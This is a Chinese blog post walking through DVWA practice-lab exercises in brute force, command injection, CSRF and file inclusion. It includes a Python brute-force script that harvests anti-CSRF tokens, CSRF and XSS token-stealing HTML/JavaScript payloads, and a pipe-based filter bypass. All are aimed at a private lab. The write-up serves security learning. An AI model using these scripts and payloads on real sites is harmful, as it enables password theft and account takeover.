@@ -1,0 +1,593 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Bsmslwx">
+  <meta name="keywords" content="">
+  
+  <title>DVWA练习 ~ BsmslwxBlog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":80,"cursorChar":".","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Bsmslwx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg4.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DVWA练习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-05 09:43" pubdate>
+        2021年7月5日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DVWA练习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年7月12日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="DVWA靶机练习"><a href="#DVWA靶机练习" class="headerlink" title="DVWA靶机练习"></a>DVWA靶机练习</h1><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解</p>
+<p>首先根据提示可以得知应该使用暴力破解，用户先尝试常用的admin,之后使用bp抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705100259939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>之后使用常用字典进行暴力破解</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705100312291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>经过长度判断密码为password</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705101158834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<h2 id="high模式"><a href="#high模式" class="headerlink" title="high模式"></a>high模式</h2><p>由于有token检测，所以需要先访问界面获取token之后进行爆破</p>
+<p>需要编写程序获取内容后进行爆破。程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bs4<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b</span>(<span class="hljs-params">path</span>):</span><br>    password=<span class="hljs-built_in">open</span>(path)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> password.readlines():<br>        <span class="hljs-comment"># 设置获取token的请求内容</span><br>        url=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/brute/index.php&quot;</span><br>        headers=&#123;<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span> : <span class="hljs-string">&#x27;security=impossible; security=high; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>        &#125;<br><br>        r=requests.get(url=url,headers=headers)<br>        soup=bs4.BeautifulSoup(r.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        token=soup.select(<span class="hljs-string">&quot;input&quot;</span>)<br>        <span class="hljs-comment"># 得到token</span><br>        toke=token[<span class="hljs-number">3</span>][<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-comment"># 设置请求密码的内容</span><br>        url=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/brute/index.php&quot;</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span> : <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span> : line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(),<br>            <span class="hljs-string">&#x27;Login&#x27;</span> : <span class="hljs-string">&#x27;Login&#x27;</span>,<br>            <span class="hljs-string">&#x27;user_token&#x27;</span> : toke<br>        &#125;<br>        r=requests.post(url=url,data=data,headers=headers)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(line)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;false&#x27;</span>)<br>b(<span class="hljs-string">&quot;D:/BrupSuite/mma/top1000.txt&quot;</span>)<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h1><p>命令执行</p>
+<ol>
+<li><p>设置为low、medium时使用|绕过即可如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706161900253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>high模式下查找源码如下</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>	<span class="hljs-comment">// Check Anti-CSRF token</span><br>	checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>	<span class="hljs-comment">// Get input</span><br>	<span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>	<span class="hljs-variable">$target</span> = stripslashes( <span class="hljs-variable">$target</span> );<br><br>	<span class="hljs-comment">// Split the IP into 4 octects</span><br>	<span class="hljs-variable">$octet</span> = explode( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br>	<span class="hljs-comment">// Check IF each octet is an integer</span><br>	<span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;jinru&#x27;</span>;<br>		<span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.</span><br>		<span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>		<span class="hljs-comment">// Determine OS and execute the ping command.</span><br>		<span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>			<span class="hljs-comment">// Windows</span><br>			<span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">// *nix</span><br>			<span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>		&#125;<br><br>		<span class="hljs-comment">// Feedback for the end user</span><br>		<span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;weiru&#x27;</span>;<br>		<span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>		<span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p>将输入按照.分为数组，且数组中均为数字，且数组长度为4</p>
+<p>暂时无法绕过</p>
+<p>3.Impossible在 DVWA v1.9 之前，这个级别被称为“high”，查找到high模式后</p>
+<p>查看源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br></code></pre></div></td></tr></table></figure>
+
+<p>其中|的过滤不够完善，之后更有空格，将空格去掉，即可进行命令操作</p>
+<p>如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706164731144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol>
+<li><p>设置low模式下，首先对内容抓包后发现只是一个请求，尝试直接将该请求嵌入界面后点击。编写代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>csrf练习<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/csrf/&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password<span class="hljs-symbol">&amp;#95;</span>new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1234&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password<span class="hljs-symbol">&amp;#95;</span>conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1234&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>点击后密码就被修改。</p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706111806917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置medium模式下，查看源码后发现对来源的地址进行了检查，进行了内容的查找。进行抓包后修改referer即可修改成功。不清楚如何在只有html界面的情况下修改。根据网上信息，将文件名修改为127.0.0.1.html可以进行修改。由于源目录包含了127.0.0.1所以可以成功修改。</p>
+</li>
+<li><p>设置high模式下，此时发送的请求带有token，且服务器端也有token的检查。</p>
+<p>此时需要结合xss攻击获取token后进行密码的修改。在查看csrf界面的源码后发现是设置在form中可以使用document.getElementsByName获取token的内容，此时在xss界面进入csrf界面并获取token等信息进行密码的修改</p>
+<p>具体代码为应为：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">  </span>&#123;</span><br><span class="javascript">      <span class="hljs-comment">// 设置获取token</span></span><br><span class="javascript">   <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">  <span class="hljs-comment">// 提交</span></span><br><span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit(); </span><br><span class="javascript">  &#125;</span><br><span class="javascript"></span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p>但是由于长度限制和script的过滤我无法全部写入，只注入了获取token的内容</p>
+<p>&lt;iframe src=”../csrf”onload=alert(frames[0].document.getElementsByName(‘user_token’)[0].value)&gt;</p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/2021070611183711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><ol>
+<li><p>low 对文件进行包含发现</p>
+<p>目标的目录结构如图所示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705125325159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>此时尝试目录穿越读取文件</p>
+<p>使用相应的协议读取php文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705125342234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>将读取的内容进行解码即可得到代码</p>
